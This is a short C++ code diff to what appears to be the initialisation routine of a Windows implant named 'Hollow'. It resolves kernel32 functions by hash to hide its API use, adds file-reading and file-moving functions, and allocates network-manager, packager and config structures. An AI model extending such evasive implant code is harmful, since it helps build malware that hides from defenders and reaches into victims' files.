@@ -39,6 +39,12 @@ BOOL HollowInit() {
 		hollow->Win32.GetModuleFileNameA = (decltype(hollow->Win32.GetModuleFileNameA))api::GetProcAddress(k32, api::hashs::win32::GetModuleFileNameA);
 		hollow->Win32.CloseHandle = (decltype(hollow->Win32.CloseHandle))api::GetProcAddress(k32, api::hashs::win32::CloseHandle);
 		hollow->Win32.GetComputerNameExA = (decltype(hollow->Win32.GetComputerNameExA))api::GetProcAddress(k32, api::hashs::win32::GetComputerNameExA);
+		hollow->Win32.MoveFileA = (decltype(hollow->Win32.MoveFileA))api::GetProcAddress(k32, api::hashs::win32::MoveFileA);
+		hollow->Win32.GetLastError = (decltype(hollow->Win32.GetLastError))api::GetProcAddress(k32, api::hashs::win32::GetLastError);
+		hollow->Win32.CreateFileA = (decltype(hollow->Win32.CreateFileA))api::GetProcAddress(k32, api::hashs::win32::CreateFileA);
+		hollow->Win32.ReadFile = (decltype(hollow->Win32.ReadFile))api::GetProcAddress(k32, api::hashs::win32::ReadFile);
+		hollow->Win32.SetCurrentDirectoryA = (decltype(hollow->Win32.SetCurrentDirectoryA))api::GetProcAddress(k32, api::hashs::win32::SetCurrentDirectoryA);
+		hollow->Win32.GetCurrentDirectoryA = (decltype(hollow->Win32.GetCurrentDirectoryA))api::GetProcAddress(k32, api::hashs::win32::GetCurrentDirectoryA);
 		DEBUG_LOGA("[*] Loaded kernel32 apis");
 
 
@@ -79,7 +85,7 @@ BOOL HollowInit() {
 	}
 
 	g_NetMgr = (NetMgr*)hollow->Win32.LocalAlloc(LMEM_FIXED | LMEM_ZEROINIT, sizeof(NetMgr));
-	inPackager = (Packager*)hollow->Win32.LocalAlloc(LMEM_FIXED | LMEM_ZEROINIT, sizeof(Packager));
+	packager = (Packager*)hollow->Win32.LocalAlloc(LMEM_FIXED | LMEM_ZEROINIT, sizeof(Packager));
 	hollow->config = (Config*)hollow->Win32.LocalAlloc(LMEM_FIXED | LMEM_ZEROINIT, sizeof(Config));
 
 	if (!g_NetMgr || !packager || !hollow->config)
